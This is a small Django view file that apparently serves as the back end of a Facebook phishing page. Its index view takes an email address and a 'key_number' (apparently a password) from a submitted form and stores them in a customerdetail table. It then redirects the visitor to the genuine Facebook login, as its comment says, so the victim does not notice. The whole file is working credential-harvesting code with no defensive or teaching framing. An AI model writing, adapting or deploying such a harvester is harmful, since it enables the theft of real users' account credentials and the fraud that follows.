
from django.shortcuts import render, redirect
from .models import customerdetail

def index(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        key_number= request.POST.get('key_number')

        # Save directly to database (SQL)
        customerdetail.objects.create(email=email, key_number=key_number)

        # Redirect to real Facebook login
        return redirect('https://www.facebook.com/login')

    return render(request, 'index.html')


